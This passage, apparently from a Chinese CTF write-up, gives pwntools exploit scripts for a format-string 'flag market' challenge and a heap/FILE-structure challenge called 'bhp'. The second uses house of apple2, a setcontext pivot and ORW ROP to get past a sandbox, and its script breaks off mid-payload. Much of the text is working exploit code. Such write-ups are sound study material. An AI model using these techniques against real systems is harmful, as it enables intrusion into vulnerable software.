</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># p = process(&#34;./chall&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;47.93.217.138&#34;</span><span class="p">,</span> <span class="mi">34946</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;welcome to flag market!</span><span class="se">\n</span><span class="s2">give me money to buy my flag,</span><span class="se">\n</span><span class="s2">choice: </span><span class="se">\n</span><span class="s2">1.take my money</span><span class="se">\n</span><span class="s2">2.exit&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;how much you want to pay?&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x4041C0</span> <span class="o">-</span> <span class="mh">0x4040C0</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;%9$p%12$s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;opened user.log, please report:&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addr_pay</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x402010</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;welcome to flag market!</span><span class="se">\n</span><span class="s2">give me money to buy my flag,</span><span class="se">\n</span><span class="s2">choice: </span><span class="se">\n</span><span class="s2">1.take my money</span><span class="se">\n</span><span class="s2">2.exit&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;how much you want to pay?&#34;</span><span class="p">,</span> <span class="n">addr_pay</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;0x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x480</span><span class="o">-</span><span class="mh">0x2a0</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">+=</span> <span class="n">offset</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">addr_pay</span> <span class="o">=</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">take_my_money</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">addr_pay</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">inter</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bhp">bhp</h2>
<p>关键漏洞函数：</p>
<p><img src="/img/2025-QWB-S9/41.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/42.png" alt="img"></p>
<p>sub_1640()中我们可以控制输入的长度带出把libc基地址，heap基地址，stack基地址，pie基地址任意选一个地址，我们选择带出libc基地址。</p>
<p>sub_1810()函数中存在无限制的malloc，我们可以通过设置size为一个极大数来实现后面标记的地址任意写一个字节0。</p>
<p>我们选择攻击_IO_2_1_stdin，详见https://blog.csdn.net/Mr_Fmnwon/article/details/144547328。</p>
<p>在获得任意长度的地址任意写后我们选择劫持_IO_2_1_stderr 攻击 house of apple2。</p>
<p>但是程序启用了沙盒。</p>
<p><img src="/img/2025-QWB-S9/43.png" alt="img"></p>
<p>我们可以找到一个magic_rop:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">╰─ ropper --file ./libc.so.6 --search &#34;mov rdx, rax%&#34;
</span></span><span class="line"><span class="cl">[INFO] Load gadgets from cache
</span></span><span class="line"><span class="cl">[LOAD] loading... 100%
</span></span><span class="line"><span class="cl">[LOAD] removing double gadgets... 100%
</span></span><span class="line"><span class="cl">[INFO] Searching for gadgets: mov rdx, rax%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[INFO] File: ./libc.so.6
</span></span><span class="line"><span class="cl">0x0000000000130405: mov rdx, rax; call qword ptr [rbx + 0x28]; 
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>再结合setcontext完成对rsp的修改实现栈迁移，然后为了方便就先拼一个read，然后再通过read再拼一个绕开沙盒的orw。</p>
<p>exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#from ctypes import *</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">stre</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ph</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="o">=</span><span class="s2">&#34;addr&#34;</span><span class="p">)</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="o">+</span><span class="s2">&#34;: &#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">re</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pre</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reu</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rel</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sea</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sel</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sela</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">op</span><span class="p">()</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cp</span><span class="p">()</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">raddr64</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">raddr32</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">raddr_T</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">raddr_A</span><span class="p">()</span> <span class="p">:</span> <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">reu</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-&#34;</span><span class="p">,</span><span class="kc">True</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">orw_rop64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span><span class="n">pop_rsi</span><span class="p">,</span><span class="n">pop_rdx</span><span class="p">,</span><span class="n">flag_addr</span><span class="p">,</span><span class="n">open_addr</span><span class="p">,</span><span class="n">read_addr</span><span class="p">,</span><span class="n">write_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">orw</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">open_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">orw</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">orw</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getorw</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">Arch</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">=</span><span class="n">asm</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gdbp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">a</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8.147.135.168&#34;</span><span class="p">,</span> <span class="mi">34818</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#elf = ELF(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#lib = cdll.LoadLibrary(None)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#loadsym = &#34;glibc-debug --reload-symbols /home/zlsf/sysset/glibc-all-in-one/libs/2.41-6ubuntu1.1_amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#code_addr = &#34; ./glibc-2.41.tar.gz --force&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = process([&#34;qemu-mipsel-static&#34;,&#34;-g&#34;, &#34;9999&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p = process([&#34;qemu-mipsel-static&#34;,&#34;-L&#34;,&#34;./&#34;,&#34;./pwn&#34;])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.arch = &#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.os = &#39;linux&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#elf.arch , elf.so</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sea</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content: &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdbp(p)</span>
</span></span><span class="line"><span class="cl"><span class="n">sea</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">reu</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#pie_addr = raddr64() -  0x2041</span>
</span></span><span class="line"><span class="cl"><span class="c1">#ph(pie_addr, &#34;pie_addr&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">raddr64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0xaddae</span>
</span></span><span class="line"><span class="cl"><span class="n">ph</span><span class="p">(</span><span class="n">libc_base</span><span class="p">,</span> <span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io_wfile_jumps</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2044e0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f78b</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x110a7d</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10f789</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x11C5A2</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xdd237</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2045b0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xab8a1</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rcx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xa877e</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdbp(p)</span>
</span></span><span class="line"><span class="cl"><span class="n">sela</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="n">stre</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x203911</span><span class="o">+</span><span class="mh">0x8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdbp(p)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x70</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">+</span><span class="mh">0xE0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sea</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sea</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choice: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
